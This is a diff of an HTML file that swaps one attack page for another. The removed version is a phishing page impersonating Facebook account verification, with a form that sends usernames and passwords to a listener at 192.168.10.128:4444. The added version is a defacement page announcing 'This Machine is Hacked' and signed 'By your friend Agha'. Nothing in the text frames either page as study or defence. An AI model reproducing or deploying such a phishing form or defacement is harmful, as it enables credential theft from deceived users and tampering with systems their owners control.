@@ -3,61 +3,38 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Facebook Account Verification</title>
+    <title>Machine Hacked</title>
     <style>
-        body {
-            font-family: Arial, sans-serif;
-            background-color: #f0f2f5;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            height: 100vh;
+        body, html {
+            height: 100%;
             margin: 0;
+            font-family: Arial, sans-serif;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            background: url('https://wallpaperaccess.com/full/11222686.jpg') no-repeat center center fixed;
+            background-size: cover;
         }
-        .container {
-            background-color: #fff;
-            padding: 20px;
-            box-shadow: 0 4px 8px rgba(0,0,0,0.1);
-            border-radius: 8px;
-            width: 300px;
-        }
-        h1 {
-            color: #1877f2;
+        .overlay {
+            position: absolute;
             text-align: center;
+            color: white;
+            font-size: 3rem;
         }
-        input[type="text"], input[type="password"] {
-            width: 100%;
-            padding: 10px;
-            margin: 10px 0;
-            border: 1px solid #ccc;
-            border-radius: 4px;
+        .overlay h1 {
+            margin: 0;
+            font-size: 4rem;
         }
-        button {
-            width: 100%;
-            padding: 10px;
-            background-color: #1877f2;
-            color: #fff;
-            border: none;
-            border-radius: 4px;
-            cursor: pointer;
-        }
-        button:hover {
-            background-color: #145dbf;
+        .overlay h2 {
+            margin: 0;
+            font-size: 1.5rem;
         }
     </style>
 </head>
 <body>
-    <div class="container">
-        <h1>Facebook</h1>
-        <form action="http://192.168.10.128:4444" method="POST">
-            <label for="username">Username or Email:</label>
-            <input type="text" id="username" name="username" required>
-
-            <label for="password">Password:</label>
-            <input type="password" id="password" name="password" required>
-
-            <button type="submit">Verify Account</button>
-        </form>
+    <div class="overlay">
+        <h1>This Machine is Hacked</h1>
+        <h2>By your friend Agha</h2>
     </div>
 </body>
 </html>
